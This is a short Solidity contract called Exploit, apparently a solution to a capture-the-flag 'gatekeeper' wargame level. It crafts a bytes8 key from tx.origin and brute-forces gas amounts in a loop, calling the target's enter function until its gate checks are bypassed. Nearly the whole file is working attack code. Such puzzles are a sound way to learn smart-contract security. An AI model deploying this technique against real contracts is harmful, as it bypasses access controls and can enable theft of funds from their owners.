// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal
// 1. bypass the gate
contract Exploit {
    address public target;
    uint public cool;

    constructor(address _t) {
        target = _t;
    }
    // try with different off
    // in my case Remix+ganache off==400
    function exploit(uint off) external returns(uint) {
        bytes8 arg = bytes8(uint64(0x8000000000000000 | uint16(uint160(tx.origin))));
        bool ok = false;
        uint start = 8192*2 + 21585 + 2992;
        uint gs= start + off;
        for (uint i = 0; i < 100;i++ ){
            gs += 1;
            (ok,) = target.call{gas: gs}(
                abi.encodeWithSignature("enter(bytes8)",arg)
            );
            if (ok) {
              cool = gs;
              return gs;
            }
        }
        revert("did not work");
    }
}
